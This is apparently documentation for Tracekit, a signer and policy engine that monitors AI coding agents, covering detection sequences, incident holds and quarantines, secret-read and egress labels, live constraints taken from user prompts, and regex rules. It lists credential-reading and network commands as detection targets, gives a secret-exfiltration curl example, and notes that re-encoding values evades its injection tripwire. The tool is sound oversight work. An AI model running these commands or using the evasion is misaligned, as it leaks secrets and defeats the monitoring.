Limits ([all of Tracekit's](limits.md)): it matches values verbatim, and only what came in through untrusted tools and observed inputs: a page the
agent fetches with a tool the policy doesn't list as untrusted (`curl` in a shell) is not indexed, so list such tools
or observe the content. A value the model paraphrases, splits or re-encodes (spelled out, base64, a URL
shortener) reads as a new value and gets past it. `trust: "trusted"` is the calling process's claim: provenance
protects against injected content, not against a malicious agent program. It is a tripwire on the commonest way
injected instructions act; to prevent the flow, use information-flow control (CaMeL, FIDES) in the agent.

## Detection: sequences, limits and respond

A rule decides each call on its own. Detection looks across calls: a secret read and then a URL, a runaway loop, a
burst of deletes, repeated denied attempts. It runs in the signer (`tracekit/signer/detect.py`), is part of the policy
(so it is in `policy_hash`), and is a pure function of signed records: a verifier or `tracekit policy backtest` gets
the same answer from the same records. No regex runs for it: it reads the rule ids each decision already carries.

```yaml
sequences:
  - id: TK-Q001
    steps: [secrets_access, egress]   # rule ids or labels, in order
    scope: session                    # run (default), session, owner or principal
    window: 600                       # seconds from the first step
    unless: [allowlisted]             # optional: a call that also carries one of these is not a step
limits:
  - id: TK-L002
    match: destructive                # a rule id, a label, or * (every call)
    count: true                       # or sum: {field: cents, currency_field: currency}
    max: 30                           # an incident when a window goes past it
    window: 60
    scope: session
respond:
  - {trigger: TK-L002, mode: shadow, action: hold}   # mode off|shadow|enforce, action notify|hold|quarantine
  - {trigger: denied_calls, mode: shadow, action: notify, max: 5, window: 300, scope: run}
  - {trigger: executed_against_policy, mode: enforce, action: quarantine, cooldown_s: 3600}
```

**What counts.** A call's names are its rule ids from both class readings (the policy's and the client's hint, so a
mismatch can't hide a step), each rule's `label`, and `*`. A call counts when it was decided `allow` or `flag`, or, for
`ask`, once the approval of that decision is consumed; never when it was asked and not consumed, or denied, and never
later: a step counts when it is decided, whether or not the call then runs. A call that runs against its decision is
`executed_against_policy` (below), not a step. A call whose class is unknown (a tool the policy doesn't map, such as
an alias) matches every step and limit: fail closed.

One call advances each partial sequence by one step, or, when its own names match consecutive steps, through all of
them, each name once: a command that reads a secret and sends it (`curl "https://host/?k=$(cat .env)"`) completes
`[secrets_access, egress]` on its own, while `[egress, egress]` still needs two calls. A step reached through `*` or
an unknown class never takes a call further, so no single unmapped call completes a sequence.

A sum limit reads the `field` (an integer of minor units, cents, at least 0) and the `currency_field` (a three-letter
code, case and surrounding spaces aside) of the call's arguments and keeps one total per currency. A call of a known
class it counts without both is held (`ask`, rule `TK-LIMIT-SUM`: send the amount as a non-negative integer in minor
units with its currency code), unless the limit's `respond` mode is `off`; an unknown-class call is counted when its
amount can be read and is never held for it. Lint rejects unknown names, a name only deny rules carry (it can never
count), windows outside 1..86400 s, more than 64 steps or more than 1024 sequences and limits together, a limit keyed
by a raw tool name (name a rule or label: an alias can't dodge those), a sum limit matching `*`, and sequences or
limits while `unknown_tools` is `allow`.

**Labels.** The packs label their flag rules. `secrets_file` (`TK-F005`) is any call that acts on a secrets file's
name read as a path (`.env`, `.env.local`, `prod.env`, `id_rsa`, `.ssh/`, `.aws/`, `.netrc`, and `credentials` after a
`/`, with an extension or as a folder): a command's argv or redirection, a file path, an MCP tool's arguments (not the
text it only carries, as `target` reads them) or a URL, of any tool, writes included; a target that is one env template
path (`.env.example`, `.sample`, `.template`, `.dist`) is not, and neither is the word in code or prose
(`process.env.X`, `get_credentials()`, "the credentials"); a read of one is `secrets_access` (`dev.yaml`'s `TK-F033`
to `TK-F035`, [run conditions](#run-conditions)). `egress` is any URL a call acts on (`TK-F012`: an http or
browser URL, a URL in a command, an MCP tool's arguments but the text it only carries; GETs with a query string
included, not only `sends_to`), except a subject whose every URL is on this machine (`localhost`, `127.x.x.x`,
`[::1]`, `0.0.0.0`) and one that is a single plain URL (http or https, a host name, no query string: a web read, or a
link a subagent's prompt names), and any network command whatever it names (`TK-F013`: curl, wget, ssh, scp, rsync,
nc, ncat, telnet, ftp, dig, nslookup, host), except curl, wget, HTTPie or xh whose every target is on this machine
and that read no hosts from a file (`-K`, `--config`, wget's `-i` or `-e`).
Mail, payments, SQL and MCP tools without a URL in their arguments are not egress in the coding pack (`dev.yaml` adds
an email send with a recipient, an MCP tool named for sending, a write to a service's MCP server (GitHub, Linear,
Notion, Gmail and their kind), a web fetch to any host and a web search, gh's writes, git push, PowerShell's web and
mail commands and bash's `/dev/tcp`: `TK-F037` to `TK-F041`, `TK-F044`): label your own tools that send data out
(`label: egress` on a flag rule) to bring them in. These are the laptop packs' rules (`coding.yaml`, `dev.yaml`,
which run no sequence: `dev.yaml`'s `TK-Q001` is a [run condition](#run-conditions)). `server.yaml`, and `strict.yaml` with it, keep the wider `TK-F003`, `TK-F005`, `TK-F012` and
`TK-F013` that their detection counts, and add `TK-F028`: there every destructive command word on a line, every
secrets-file name (its `TK-F005` labelled `secrets_access`), every URL, every network command and every email
send with a recipient counts, as before.

**Scope.** `run` is one run; `session` is the root of the run's `parent_run` chain (a run registered without a parent
is its own session, so a split across runs is caught only when the second names the first as parent); `owner` is the
identity that registered the run; `principal` is the run's attested principal (an unattested one counts as `owner`).

**Windows** are fixed: one starts at the first call counted and lasts `window` seconds of the records' `ts`, the
signer's clock. A burst that straddles two windows can reach up to twice `max` before a limit fires. A scope with no
record for an hour (or the longest window, if longer) starts over, open incidents included.

**Decisions** under a policy with sequences or limits carry what detection saw:
`detect: {sequences: [{id, step}], limits: [{id, count, window_start}], state}` (with `rule_ids` when the two class
readings differ, and `sums` for sum limits). `state` is `complete`, or `unavailable` when the detector can't vouch for
what came before: after a restart from a snapshot written without detection or under another policy (until the
longest window has passed), after replaying decisions made under another policy (until the longest window after the
last of them), and for a run it never saw registered. Runs open across such a restart keep their session, owner and
principal.

**Triggers and incidents.** A sequence completing and a limit going past `max` open an incident (`mode: off` in
`respond` silences one). These triggers fire only with a `respond` entry: `executed_against_policy` (a call ran after a
deny or an unapproved ask), `denied_calls` (more than `max` distinct denied calls, per tool call and attempt, in
`window`, at most 1000; nondeterministic denies, and denies that only `TK-ARGS-INVALID` or `TK-OVERSIZE` caused,
don't count), `provenance` (a `from: untrusted` rule held a call whose decision names its provenance and whose index is
complete), and the notify-only `class_mismatch`, `refusal_burst` (a `refusal.summary` over `max`) and `tamper`, which
are never enforced (lint refuses `mode: enforce` or an action other than `notify` on them). Only `denied_calls` takes
`max`, `window` and `scope`, and `refusal_burst` `max`; lint refuses them elsewhere. `unexplained_effect` (a host an
[egress observer](egress.md) saw a run reach that nothing explains) fires once per host and run; the server pack
notifies on it in shadow mode until a deployment's `explains` is tuned.

An incident is a signed `incident.opened {incident_id, trigger, rule_ids, scope, cites, mode, actions, would}` in the
run whose record fired it, citing the records that make it up. One stays open per scope, trigger and rule: later
matches are an `incident.updated {incident_id, cites}` at most once per window of its trigger (a minute for a trigger
without one), written in the run whose record matched, which for a `session`, `owner` or `principal` scope can be
another run than the one that opened it. Only opened incidents count toward the caps: 100 per run and trigger, 60 per
tenant a minute, of which one run may open 20; past a cap one `incident.capped {cap, max, trigger, reason}` is written
instead. An incident carries its trigger's `respond` mode. In **shadow** it has no `actions` and `would` names the
configured action. In **enforce** the signer acts in the same writer step as the record that fired it and lists what it
did in `actions`:

| `action` | What the signer does ([incidents](incidents.md)) |
|---|---|
| `notify` | Nothing more than delivering the incident to every webhook subscribed to `incident` events, at least once (the signer refuses to start without one). |
| `hold` | Every live run the incident's scope reaches is held: its live approvals expire, and each further call is an `ask` (rule `TK-HOLD`, with the `incident_id`) that only a person answers: never an agent approver, never the run's owner, principal or requester, whatever `self_approval` says. The call that fired the hold is decided again, held. With no person approver configured, a hold is a quarantine. |
| `quarantine` | Every live run the scope reaches is quarantined, for good: each further call is denied (`TK-QUARANTINE`; past 100 such denies, refused unrecorded), approvals are refused, a gateway forwards no further model request of it, and it closes with reason `quarantine`. |

`cooldown_s` (default 3600, at most 86400): for that long, a new run of the same owner and attested principal (and any
child run of a held one) starts held or quarantined too. No trigger suspends an identity: that is an operator's call
(`tracekit signer incidents suspend`), and lint refuses `suspend:` in `respond`. Operators resolve incidents, hold, quarantine and resume runs, pause the response engine and suspend identities
with `tracekit signer incidents` ([incidents](incidents.md)).

**Backtest.** `tracekit policy backtest --policy P --store DIR` (a signer's `data_dir/store`, read-only, safe while it
runs) or `--bundle B...` runs the policy's detection over recorded runs and prints the incidents it would open. It
also prints, for each limit, the highest count (or sum, per currency) any one window reached, with its scope and the
run, so a limit that opened nothing still shows how close it came; windows are fixed, so a burst across two reads lower
than its true peak. It reads the rule ids each decision recorded (arguments are not stored), so for decisions made under another policy, rules
and labels the new one adds or changes are not applied; it warns with their count. Backtest changes to sequences,
limits and `respond` this way; measure a new rule by adding it under `flag` and watching new runs, then moving it to
`ask` or `deny` ([your own policy](policy-guide.md#4-roll-it-out-as-flag-first)).

### Choosing thresholds

The server pack's thresholds are judgment, checked against the shipped runs: the golden v2 bundles
(`tests/golden/v2/`, decided under a test policy) and the server demo (`tracekit demo --server`, decided under this
pack). Those runs are small (at most 6 decisions in any minute, none of them labelled `destructive`) and open no
incident; `TK-L001` (every call) and `TK-L002` (`destructive`, `TK-F003` as the server pack reads it) sit well above
them: 300 calls a minute (an agent working makes a few dozen) and 30 destructive commands a minute. No run exercises
`TK-Q001`: the server demo's credentials read is denied and its send to the host a web page named is held and
rejected, so neither counts as a step, and the golden bundles record a test policy's rule ids; its ten minutes are a
judgment of how long a secret read and its use stay related. Before enforcing anything,
record runs under the pack in shadow, backtest your own store and set `max` above the busiest minute you see.

## Run conditions

A rule decides each call on its own, and detection reports what a run did after the fact. A run condition does both:
a rule with `when: {run_has: [label, ...]}` applies only once the run carries every label it names, so a call that is
routine in a clean run waits for a person in a run that read a secret or untrusted content.

```yaml
ask:
  - id: TK-Q001
    field: labels                      # the labels of the rules this call matched, sorted, joined by spaces
    pattern: '(?:^| )egress(?: |$)'
    when: {run_has: [secrets_access]}
```

**Labels.** A run carries labels of a closed set:

| Label | Set when a call runs that | Shipped sources |
|---|---|---|
| `secrets_access` | matched a rule labelled `secrets_access` | `dev.yaml`'s reads of a file a secret is kept in (`.env` and its kind, `.envrc`, `.netrc`, credentials files, `.ssh/`, `.aws/`, `.gnupg/`, `.npmrc`, `.pypirc`, gh's `hosts.yml`, an SSH private key): by a tool that reads it (`TK-F033`: Read, Grep; `TK-F042`: Grep over files its glob names, `.env*`; `TK-F043`: an MCP server's file read, `read_file`, `read_multiple_files`), as the operand of a command that reads or copies it or in an interpreter's words (`TK-F034`: `cat`, `grep`, `grep ''`, `source`, `cp .env x`, `python -c`, PowerShell's `Get-Content`, `git show HEAD:.env`, `find -name .env -exec cat`, `rg -g .env`, a pattern such as `./*env`), or redirected into a command (`TK-F035`), but never a file that is never secret (in `.ssh/`: `known_hosts`, `config`, `authorized_keys` and a public key; a `.env` template; prose named for credentials, `*.md`, `*.rst`, `*.adoc`; `~/.aws/config` stays, as it can hold access keys). A call that only names such a file (`ls -la .env`, `git check-ignore .env`, a write) sets nothing: `TK-F005` flags it with its own label, `secrets_file`. `TK-F031`, a stored secret printed (`printenv`, `env`, `echo $GITHUB_TOKEN`, `git credential fill`, `gcloud auth print-access-token`, `aws configure get aws_secret_access_key`, `gpg --export-secret-keys`, `docker inspect`, `ps eww`); `TK-F036`, a password manager's MCP read; a credential or secret-store read, once its approval is consumed (`TK-A020`, `TK-A021`, `TK-A035` to `TK-A038`, `TK-A052`, `TK-A053`: a keychain, a password manager, `gh auth token`, a cloud secret store, Kubernetes, Vault) |
| `untrusted_content` | is of a tool the policy's `untrusted` list names (a web fetch or search, a browser read, an MCP tool), or matched a rule labelled `untrusted_content`; and an input observed as untrusted (`observe`: a mail or ticket the app read) | the packs' `untrusted` lists; `dev.yaml`'s `TK-F032`, a file in a home folder's Downloads (not a URL's `downloads/`) |
| every label the policy reads | is a call the policy couldn't read (`TK-OVERSIZE`, over 64 KiB); and calls the signer never decided: events it never got (a `client_counter_gap`, whose labels the call that shows it meets), a signer, tailer or observer that went down (`signer_unavailable`, `tailer_lost`, `observer_lost`), a tool result with no decide (`reconcile.hook_missing`) | a person's approval of one, which says nothing of what it did; calls a client lost or held back |

A call runs when its decision allows or flags it, when the approval of its ask is consumed, or when it ran against its
decision (an `executed_against_policy` gap); a call that didn't run sets no label, though the AI approver's run bound
counts a read of a secret the policy denied or held ([approvals](approvals.md#the-ai-approver)). The signer alone sets a label: a `run.label` record right after the
record that set it, naming that record ([format](format-v2.md#3-events)). Nothing a client sends sets or clears one,
but an input it observes as untrusted, which can only hold more. A run carries only the labels its policy reads:
those its run conditions name and those the AI approver's run bound names (`approval_agent.run.clean`), so a
policy with neither writes no label record. A harness call (class `harness`: a coding agent's
message to its own agents, a subagent's report, its todo list) sets no label and meets no run condition.

**Labels belong to the requesters.** A run's requesters are its client (its owner, or the client a gateway
registered it for, never the gateway itself), each identity it was delegated to and each gateway caller that writes
it. Each carries the run's labels: before each decision, a run gets every label a run of any of its requesters
carries, in any tenant and under any principal, while that run is open and for the policy's `label_inherit_s` after
it ends (whole seconds, default 3600, at most 86400), as a `run.label` naming that run's add (`inherited`). An
identity that first writes a labelled run takes its labels then. So ending a run, starting another (a second
session, `claude -p`, the hook's next run after the agent ended its own session), naming another tenant or
principal, or working in a run it was handed keeps a label; a run of another identity, another client of the same
gateway included, gets none. The signer's `labels.labels_for(log, run, now=None)` returns them, `{label: [run_id,
run_seq]}`, one lookup per requester, for any component deciding one of the run's calls on the signer's writer, and
`labels.labels_of(log, identity, now=None)` those of one requester (an approval's). A run's records name its
requesters (`run.registered`'s `caller`, a `run.writer` for each other identity that writes it), so a signer restarted
from its records alone knows them.

**The rule.** `when` goes on an `ask` or a `flag` rule; a `deny` rule applies always (a lint error). The rule is
matched as any other and applies when the run carries its labels or a rule of the same call sets them: a command that
reads a secret and sends it asks in a run that read none before. A rule with `when` can't carry a run label itself.
`field: labels` reads the labels of the rules the call matched (but run condition rules and other rules on the labels
field), sorted and joined by spaces (`background_spawn egress`), as written in any class, so a rule names a kind of call the labelled rules define already (`egress`: `TK-F012`, `TK-F013`, `TK-F024`,
and in `dev.yaml` `TK-F037` to `TK-F041`, `TK-F044`, `TK-F046` and the held uploads `TK-A032` and `TK-A056`;
`dev.yaml`'s `TK-F013` leaves out a network command whose every target is this machine) without repeating their
patterns, or two kinds of one call;
with `when` it waits for the run's labels, without it applies at once (`dev.yaml`'s `TK-Q002`: a send left running in
the background, `launchctl submit` too). A run condition rule on the labels field with no `tool` is also read once
on the call's whole decision, the labels of every reading's rules together. The verifiers replay such a rule from
each decision's rule ids and the run's labels: a decision that doesn't name one its labels meet fails `run labels`.
They search its pattern and `unless` as RE2 reads them, in linear time and within a budget for the bundle, the same in
both verifiers: a bundle's own policy whose label pattern the signer would refuse (a repeat of a repeat, lookaround,
or a program past the linear search's size, which lint refuses too), or whose searches run past the budget, fails
`run labels` rather than hanging the verifier. Each reading of a call the signer decides (a PowerShell line read as a
shell one, text typed into a shell, a Hermes process write) keeps its run conditions and the labels it sets, even
where it doesn't decide the call. A condition rule doesn't read a subject over 64 KiB; the other rules decide such a call. Lint also refuses a
label outside the set, one named twice, and one no rule of the policy can set (`untrusted_content` always can: an
observed input sets it).

The decision records the labels that made its run conditions apply (`run_labels`), and a verifier replays the run's
labels from its records under the bundled policies, each record under the one its decision names (`run labels`). A run condition only adds rule ids to a decision: it
never lowers one. An ask rule with `mode: shadow` applies as a flag: the decision names it, with its `run_labels`, and
the call runs, so a policy records what the rule would hold before it holds anything; `mode: enforce`, or none, holds.

**Clearing a label.** A person ends a label when what set it no longer matters (the file read held test values):
`clear-label <run_id> --label secrets_access --reason "..."` of `tracekit signer incidents` (RPC `run_label_clear`, an
operator call), recorded as a `run.label` of theirs. Who may is who may resume a held run ([incidents](incidents.md)):
never the run's own owner, principal or requester. It clears the label for the run's client too, in the run's
tenant: a new run of theirs no longer inherits it from an ended run (an identity the run was delegated to keeps its
own runs'), while an open run that carries it, the one that read the secret, keeps it and passes it on until it is
cleared there too. The next call that sets it sets it again. A run that has ended is cleared too: the clear is
recorded in its tenant's signer run (naming it, `run_id`), and it ends the label for every run that took it from that
one (each open one gets a clear of its own). On a dev signer (no `approvals` config), whose one user answers their own
run's approvals, that user clears the label of the run that read the secret, open or ended (`tracekit signer incidents
clear-label <run_id> --label secrets_access --reason "..."`), recorded `self_cleared`; a run that took the label from
another can't clear it alone, and the refusal names that run (`clear it there: tracekit signer incidents clear-label
<run> --label secrets_access`), as the note a recorded send shows does. The agent runs as the same user, and
`TK-D007` denies it that command.

`dev.yaml`, the laptop default, names a send (`egress`) once the run carries `secrets_access` (`TK-Q001`), and a
send left in the background whatever the run carries (`TK-Q002`), both in shadow in 1.8: each such call is recorded,
flagged, and runs, and the Claude Code hook shows the person one line as it runs (`[tracekit] noted: this sends data
to hooks.example.com after the session read .env. Nothing is blocked in 1.8; it's in the record.`; for a label an
earlier session set, `after an earlier session (run <id>) read .env; this carries for 42 more minutes`, and on a
signer with approvers how a person clears it; decide's `recorded` names the rules in shadow and `noted` is the line).
`tracekit report` and the viewer give such a rule's reason the same way (`noted: …`). They hold once a week of normal projects measures what the holds cost ([limits](limits.md)); a
policy that extends `dev.yaml` and redefines them without `mode` holds them now.

## Live constraints

A policy is written ahead of time; a person's request often adds a limit for one task: "don't touch billing.py",
"read-only, just tell me what you'd change", "don't push". A live constraint is such a limit, held by the signer for the
rest of the run. It is experimental, new in 1.4.

The Claude Code hook (and the Codex, Cursor and Gemini hooks, which share it) reads the person's prompt at
`UserPromptSubmit`, as the harness hands it over, and sends each constraint it states with `constraint_add` (RPC 19),
each on its own and before it records the prompt; a scope (`only_change`) it leaves to `tracekit analyze --v2`
(TK-X204), since holding every other write would ask the person about each test, lockfile or build write. The
session's state keeps them: after the signer closes an idle run, the session's next run gets every constraint its
earlier prompts stated (kept before they are sent, so a signer it can't reach at that prompt loses none). A small
fixed grammar reads them ([tracekit/constraints.py](../tracekit/constraints.py)) and leaves what is ambiguous unread,
so it holds no wanted call: a condition on the work ("don't edit X until the tests pass", "while the server runs"; a
condition on the person's own go-ahead keeps the constraint, as holding the call for them is what they ask: "don't push
before I review", "never touch X without asking me first", "unless I confirm"), a question ("should I change X?"), quoted text, quoted lines and code, a description rather than an
instruction ("add a read-only mode", "we don't use the network in unit tests"), a negated change of one aspect of the
file asked for ("don't change the public API of X, just fix the bug in it"), a scoped push ("don't push to main"),
and a constraint a later clause of the same request lifts ("don't touch X for now; ... then update X too") state none
([limits](limits.md#intent-reasoning-and-action-checks)). A later "it", "them" or "there" lifts the file named before
it only in a clause that asks the agent for the change: the change word in its plain form with only words of asking or
allowing before it ("X is frozen in production, but you can edit it locally", "if tests fail, fix them"). One that
mentions a change without handing it over lifts nothing: "ask me before you change it", "I'll update it myself",
"we'll change it in the next PR", "explain how you would change it", "changing it breaks the deploy", and also "don't
forget to update it" and "you'll need to edit it", whose held call the person approves. A clause that waits on the
person lifts no file, named or by "it": "you can change it after I approve", "feel free to edit X once I say so", "to
change it, ask me first", "should you need to change it, ask me", and a lift followed by a clause that only names the
go-ahead ("you can change it later, but ask me first"). On E20's 56 honest sessions none holds a call
([evaluation](evaluation.md#e20-intent-reasoning-and-action-checks)):

| Kind | Read from | Holds |
|---|---|---|
| `keep_away` | a negated change of a file X ("don't touch / modify / edit / write to X", "make no changes to X", "please refrain from editing X"), X said to stay as it is ("leave X alone / as is", "X stays untouched", "X is read-only / off-limits / out of scope", "X must not be modified"), "hands off X", "stay away from X", "keep (all) your changes / your hands / any edits / yourself out of X" (not "keep the API key out of X"), "make no changes there" for the file named before. X is a file ("billing.py", or a name people give without an extension: "the Dockerfile", "Makefile") or a directory ("anything in vendor/", "leave src/legacy/ alone", "the vendor folder", "the .github folder"; not "the home / root / current / working / parent directory", a place rather than a folder's name; not "anything outside src/", a scope); a folder word beside a file keeps the file's constraint ("use the tmp folder for scratch files and leave config.yaml as is") | a call that writes X, or under directory X: a write tool's path or paths (every file of a Codex patch), a shell redirection, `rm`, `touch`, `tee`, `sed -i`, `dd of=`, `patch`, the destination of `cp`, `mv`, `rsync` or `scp`, `git rm`/`mv`/`restore` and `git checkout -- X`, `find -name X -delete`, a formatter writing in place (`black`, `prettier --write`, `ruff format`); shell commands read as the policy engine reads them, through `bash -c`, `eval`, wrappers, argv lists and OpenAI's `commands` |
| `only_change` | "only change / edit / modify / touch X", "only X should change", "limit the change to X", "touch nothing but X", "don't change anything except / but / other than X", "read-only except X"; "don't change anything else", "X and nothing else", "everything else is out of scope": each file the request names | a call that writes any other file: checked after the run (TK-X204), never held live by the hook |
| `read_only` | "don't change anything", "change nothing", "don't make any changes" unless what follows picks the changes out: "to", "of", "in", "on" and the like naming what they are to ("to the tests", "on main"; "... in vendor/" keeps vendor/ away), or "that", "which", "beyond", "outside", "for the sake of" ("that break the API", "beyond what the fix needs", "for the sake of style"). The whole project ("to the code / the repo / my project / the files / the workspace", "on disk", "on this machine"), how many or when ("of any kind", "in the meantime", "under any circumstances", "to any file", "for now") and how or for whom ("directly", "for any reason", "for me", "on your own") stay read-only, and "read-only" naming no file as an instruction ("read-only: just tell me", "stay read-only", "work in read-only mode") | any call that writes, commits or installs |
| `no_push` | "don't push", "never push", "no pushing", "don't push it to origin" | a `git push` |
| `no_network` | "no network (access)", "no internet", "don't use the web", "don't go online", "work / stay offline", "work without internet access" | an http or browser call, `WebFetch`, `curl`, `wget`, `ssh`, `git pull`/`fetch`/`clone`/`push`, a package install |

After the policy engine has decided, the signer checks each call of the run against the run's constraints. A call
that breaks one is raised to `ask` with the rule `TK-CONSTRAINT` added; a person answers it like any other ask (an
agent approver never does). A `deny` stays a `deny`, an `ask` stays an `ask`, and nothing is ever lowered, so a
constraint can only hold more calls. That is why any client of the run may add one, the agent's own identity included:
a made-up constraint only makes the agent wait.

The agent is told why, in its own words. The decide response carries it as `reason` (`the person's request in this run
said not to modify "billing.py"; ask the person`, with `TK-CONSTRAINT` in its `rule_ids`), and Claude Code's hook blocks
the call with it: `[tracekit] HELD, nothing ran: apr-… (TK-CONSTRAINT), expires …`, then `Why: the person's request in
this run said not to modify "billing.py"; ask the person` and the commands that answer it ([coding
agents](coding-agents.md#held-calls-approve-then-retry)). The file name comes from
the call's own arguments. The log never holds it: `constraint.added` records the kind and, for a file, a salted
commitment to its lower-cased base name ([format v2](format-v2.md#3-events)), and the signer matches a call by
committing each file it writes under that record's salt. The prompt itself is recorded beside it (`input.observed`,
source `<agent>:UserPromptSubmit`, `<agent>` the harness), its text in the content vault when the signer keeps content.

A constraint equal to one the run has (the same kind; for a file, the same name) is that one, so a request repeated
in every prompt never fills the run. A run takes 32 file constraints (`keep_away`, `only_change`); `read_only`,
`no_push` and `no_network`, at most one each, are always added. Past them a new file constraint is a signed
`capture.gap{constraint_refused}` (a `gaps` warning in `tracekit verify`), `constraint_add` answers `refused: true`,
the hook tells the person (`[tracekit] the run has the most file constraints the signer takes ...`, a non-blocking
error the harness shows), and from then on the run fails closed: every call that writes is held ("the run has the most
file constraints the signer takes (32), and a further one was not added, so every write is held"). So an agent that
adds made-up constraints to fill the run only holds its own writes. A call that writes more than 256 distinct files
is held in a run with a file constraint: the signer checks at most 256 names per call. After a signer restart the
constraints, and a refusal, come back from the run's records.

`tracekit analyze --v2` reads an approval of a held call: by an identity other than the run's (signer.yaml
`approvals`), the person approved breaking the constraint for that call, and its TK-X204 finding is low, labelled
`approved`; a self-approval (the dev signer's, where the person and the agent are one user) lowers nothing.
`tracekit analyze --v2` checks the same constraints after the run, with the model's own statements too
([TK-X204](findings.md#v2-runs-what-was-asked-said-and-done-tracekit-analyze---v2)); `tracekit verify` checks that
each `TK-CONSTRAINT` hold comes after a constraint ([verdicts](verdicts.md#live-constraints)). What the grammar misses
is in the [limits](limits.md#intent-reasoning-and-action-checks).

## Patterns: the RE2 subset

Patterns must mean the same to RE2 (`google-re2`, used when installed) and to the `regex` module in ASCII mode
(the fallback), so a decision does not depend on the engine. `tracekit policy lint` rejects:

- lookaround, backreferences, atomic groups, possessive repeats, `\Z`;
- groups other than `(?:` and `(?P<name>`, so no inline flags or comments;
- nested sets and `[: :]` classes; a letter or digit escape other than `\d \D \w \W \s \S \b \A \n \t \r \f \v \xHH`
  (inside a set: `\d \D \w \W \s \n \t \r \f \v \xHH`), and non-ASCII escapes (escaped ASCII punctuation is fine);
  `\B` too, which RE2 also finds between the bytes of one character, where the fallback finds none;
- a literal `{` that isn't escaped, a repeat without a lower bound, repeat counts above 1000 (nested counts
  multiplied: `(?:a{10}){101}` is 1010);
- an unbounded repeat whose body starts with an unbounded repeat (`(a+)+`, `(.*a)*`), the classic catastrophic shape.
  It doesn't refuse a bounded repeat of one (`^(.*?,){11}P`, 5 s on 260 characters) or overlapping alternatives
  under a repeat (`(a|aa)+$`, 3 s on 35): telling those from linear ones (`(([^"@\\]|\\.)*@){10}`, TK-M003) needs
  to know whether a repeated class can match what follows it. The fallback engine's 1 s budget and the speed test below catch
  them ([limits](limits.md#policy));
- an `unless` that matches every subject (`x|`, `.*`): its rule could never fire;
- a negated class of an escape and its complement (`[^\w\W]`), which matches nothing and the fallback reads as any
  character, and any pattern the fallback can't compile, as written or in any case;
- a letter outside ASCII in the pattern or `unless` of a rule the engine matches in any case (an `a2a` rule, one on
  the `tracekit` field): RE2 and the fallback fold them apart. A rule on the `labels` field reads labels as written.

`$` means end of text and `\s` excludes `\v`, as in RE2. The fallback engine backtracks, so a large subject can be
slow where RE2 is linear, and so can a short one under a repeat of overlapping alternatives (`secret(.|\s)*key`):
all regex matches of one decision share 1 s (reading the call, its parse and subjects, isn't charged to it; that
reading is bounded by the input size limits, as on RE2), and when it runs out the decision denies with the rule that
was matching,
leaves the remaining rules out and is marked `nondeterministic: true`. RE2 never times out, so on such a subject the
two engines can decide differently; install `google-re2` on the signer.

Each rule gets a prefilter when it is loaded: strings of two or more characters, one of which every match contains, in
lower case (`[Mm][Ee][Tt][Aa]` gives `meta`; `policy2/compile.py` `literals`), and for a pattern whose top level is a
group of alternatives, each alternative's sets of such strings (`requirements`: `TK-A039`'s `sqlite3` branch needs
`sqlite3` and one of `drop`, `delete` or `truncate`). A subject that holds none of the strings, or (one of 1 KiB or
more) not one of each set of any alternative, is not searched, and the rules that read the same subject share one copy
of it in a decision. On RE2 every rule's strings are one RE2 Set, searched once a text, so a rule's prefilter is a
lookup; the fallback engine scans for each string, and searches a pattern whose top level is an alternation one
alternative at a time, each only where the text holds one of its own strings. The prefilter never changes a decision
(tests check it on every subject the E17 corpus forms and on random patterns); it only skips searches that can't match. A rule without one is searched on every call its class and
tool reach, and `tracekit policy lint` warns about it unless a string of one character or none matches it (`^`, `.`,
`&\s*$` need no prefilter). Every shipped
pattern searches 64 KiB of text built to make it back off or rescan within 150 ms on the fallback engine (`TK-A040`
within 0.25 s), about 20 ms on an M-series Mac (`tests/test_policy2.py`; among the texts, what each of its
alternatives, nested ones too, starts with, over and over from the first character and again after the rule's literal
(`echo @.env; nc nc nc …`), and each such opening once followed by a filler (`history -a -a …`), each text also ending
in a newline), except eight that look for one thing after another with any text between, noted with their times in
[limits](limits.md#policy).

## Packs shipped

| Pack | For | Contents |
|---|---|---|
| `coding.yaml` | coding agents on a laptop | shell, file and harness self-protection rules; `unknown_tools: flag`; maps the shell, file, web and MCP tools of Claude Code, Codex, Cursor, Gemini CLI, OpenAI Agents and LangChain, srt-proxy's requests (`srt:request`, [sandbox-runtime](integrations/sandbox-runtime.md)), and `a2a:*` to `a2a` for the A2A gateway and `run.transfer`; it has no A2A rules. |
| `dev.yaml` | the signer's default | the server pack's parts (`extends: [coding, browser, server-data, server-net, server-cloud, server-comms, server-core]`), so a secret read or sent, a credentials file, the cloud metadata service, a remote delete, an access or audit-logging change and money moved are held or denied on a laptop as on a server; four differences: lighter detection (a send after a secret read is a [run condition](#run-conditions), `TK-Q001`, and a send left in the background `TK-Q002`, both in shadow in 1.8: recorded, not held, with the reads and sends that set their labels, `TK-F031` to `TK-F047`, where the server pack records the pair as a sequence; a runaway loop, `TK-L001`, and a call that ran against its decision are recorded as shadow incidents, which hold nothing), `oversize: ask` (a call over 64 KiB a deny rule can't read is held, not denied), `unknown_tools: flag` (a laptop runs tools no list names; `TK-A062` holds one given a command line or a SQL statement to run, as the server pack holds every unmapped tool: a `command`, `commands`, `cmd`, `cmds`, `script` or `shell_command` argument in any case that is anything but one plain word, or `reboot`, `shutdown`, `halt`, `poweroff` or `killall5`, or a `sql`, `query`, `statement`, `sql_query` or `stmt` argument whose statements, read as each SQL dialect lexes them (behind up to eight `(` or `EXPLAIN ANALYZE` too), write or change the schema or access, or are terminated; its field `run` is what `engine._runs` reads; Claude Code's `PowerShell` (in any case) and the signer's own MCP names (`mcp__…`) are left to their own readings), and Claude Code's `Agent`, `Task`, `SendMessage`, `SubagentHandback`, `TodoWrite`, `ToolSearch`, `Skill` and `SlashCommand` are class `harness` (and so is what the hooks map onto `Task`, Qwen Code's `agent`, Cursor's `Task`, OpenCode's and Kilo Code's `task` and Antigravity CLI's `invoke_subagent`, and onto `TodoWrite`, Qwen Code's `todo_write` and OpenCode's `todowrite`): its `target` is only the URLs and addresses it names, so `TK-S004` and `TK-F005` don't read the file names in a prompt, while `TK-S002` and `TK-S001` do; `TK-F018` flags every `SendMessage`, as a message that can leave the machine, and `TK-F019` holds an `Agent` or `Task` run remotely (`isolation: remote`), none of whose calls are decided here. Claude Code's tools that act only inside the session (`TaskStop`, `TaskCreate`, `TaskUpdate`, `TaskList`, `TaskGet`, `StructuredOutput`, `ListAgents`, `CronCreate`, `CronDelete`, `CronList`, `AskUserQuestion`, `ReadNotifications`) are class `app`: known, so not flagged as unknown tools, while every rule that reads a call's whole arguments (`TK-S002`, `TK-S004`, `TK-F005`, `TK-F012`) still reads theirs 